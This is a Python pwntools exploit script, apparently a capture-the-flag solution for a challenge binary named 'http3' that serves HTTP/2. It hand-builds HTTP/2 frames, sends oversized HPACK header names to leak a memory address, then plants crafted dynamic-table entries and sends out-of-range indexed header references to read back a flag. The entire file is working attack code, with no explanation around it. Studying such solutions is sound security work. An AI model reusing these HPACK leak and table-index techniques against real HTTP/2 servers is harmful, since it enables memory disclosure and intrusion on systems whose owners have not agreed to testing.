from pwn import p32, flat, u64, p64
from hpack import Encoder

CHALL = "./http3"
LIBC = "./libc-2.39.so"


class Frame():
    def __init__(self, io, frame_type, flags, id, data, size=0):
        if size == 0:
            self.size = len(data)
        else:
            self.size = size
        self.frame_type = frame_type
        self.flags = flags
        self.id = id
        self.data = data
        self.io = io

    @property
    def header(self):
        data = [
            self.size >> 16, self.size >> 8, self.size >> 0,
            self.frame_type,
            self.flags,
            self.id >> 24, self.id >> 16, self.id >> 8, self.id >> 0
        ]
        data = [p32(i, endianness="big")[-1] for i in data]

        header = b"".join([int.to_bytes(i) for i in data])
        return header

    def __recv_header(self):
        header = self.io.recv(9, timeout=0.1)
        len = int.from_bytes(header[:3])

        if len <= 0:
            return header

        return self.io.recv(len)

    def send(self, recv=True):
        self.io.send(self.header)
        self.io.send(self.data)
        if recv:
            self.__recv_header()
            return self.__recv_header()


def pack_int(n, prefix):
    N = 8 - len(prefix)
    if n < (1 << N) - 1:
        return bytes([int(prefix+f"{n:b}".rjust(N, "0"), 2)])
    n -= (1 << N)-1
    bts = []
    first = True
    while first or n:
        bt = n & 0x7f
        if n >= 0x7f:
            bt |= 0x80
        bts.append(bt)
        n >>= 7
        first = False
    return bytes([int(prefix+f"{(1 << N)-1:b}", 2)]+bts)


def exploit(io, elf):
    # handshake
    io.send(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    io.recv()

    frame = Frame(io, 0x4, 0, 0, b'')
    frame.send()

    # leak
    e = Encoder()
    data = [
        ("A"*0xfff, "GET"),
        ("A"*0xfff, "GET")
    ]
    data = e.encode(data, huffman=False)

    ret = Frame(io, 0x1, 0, 0, data).send()
    io.recv(timeout=0.01)

    flag = u64(ret[304:][:8])
    io.success("flag @ 0x%hx" % flag)

    # exploit
    data = [
        p64(0x80)+p64(flag), b'flag'
    ]
    data = e.add(data, False)
    ret = Frame(io, 0x1, 0, 0, data).send()

    index = (0x23040 >> 5)+1+61
    data = flat(
        pack_int(index, "1"),
        pack_int(index, "1"),
    )
    ret = Frame(io, 0x1, 0, 0, data).send()
    flag = ret.split(b': ')[-1].decode()
    return flag
